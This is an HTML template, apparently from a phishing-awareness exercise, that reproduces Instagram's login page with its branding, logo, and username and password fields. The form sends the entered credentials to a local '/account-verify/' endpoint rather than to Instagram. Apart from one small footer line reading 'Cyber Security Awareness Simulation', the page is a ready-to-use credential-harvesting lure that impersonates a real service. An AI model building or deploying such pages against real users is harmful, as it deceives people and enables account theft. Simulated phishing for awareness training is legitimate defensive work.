<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Instagram</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');

body{
    background:#fafafa;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI",
                 Roboto, Helvetica, Arial, sans-serif;
    -webkit-font-smoothing: antialiased;
}

.container{
    width:350px;
    margin:60px auto;
    background:#fff;
    border:1px solid #dbdbdb;
    padding:40px 40px 30px;
    text-align:center;
}

.logo{
    font-family: 'Inter', -apple-system, BlinkMacSystemFont,
                 "Segoe UI", Roboto, Arial, sans-serif;
    font-size:32px;
    font-weight:700;
    margin-bottom:28px;
    letter-spacing:-0.5px;
}

input{
    width:100%;
    padding:10px 12px;
    margin:6px 0;
    border:1px solid #dbdbdb;
    background:#fafafa;
    border-radius:3px;
    font-size:12px;
    font-family: -apple-system, BlinkMacSystemFont,
                 "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
}

input:focus{
    outline:none;
    border-color:#a8a8a8;
    background:#fff;
}

button{
    width:100%;
    background:#0095f6;
    border:none;
    color:white;
    padding:8px;
    font-weight:600;
    border-radius:8px;
    margin-top:12px;
    cursor:pointer;
    font-size:14px;
}

button:hover{
    background:#1877f2;
}

.or{
    margin:20px 0;
    color:#8e8e8e;
    font-size:13px;
    font-weight:500;
}

.fb{
    color:#385185;
    font-weight:600;
    margin-bottom:12px;
    font-size:14px;
}

.link{
    font-size:12px;
    color:#00376b;
    margin-top:10px;
}

.footer{
    margin-top:25px;
    font-size:14px;
}

.signup{
    color:#0095f6;
    font-weight:600;
}

.lab{
    margin-top:15px;
    font-size:11px;
    color:#8e8e8e;
}
</style>


</head>

<body>

<div class="container">
    <div class="logo">
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" 
         style="width:32px; vertical-align:middle; margin-right:8px;">
    Instagram
</div>

<form method="POST" action="/account-verify/">
    {% csrf_token %}
    <input name="username" required>
    <input name="password" type="password" required>
    <button type="submit">Log in</button>
</form>

    

    <div class="or">OR</div>

    <div class="fb">Log in with Facebook</div>

    <div class="link">Forgot password?</div>

    <div class="footer">
        Don't have an account? <span class="signup">Sign up</span>
    </div>

    <div class="lab">
        Cyber Security Awareness Simulation
    </div>
</div>

</body>
</html>
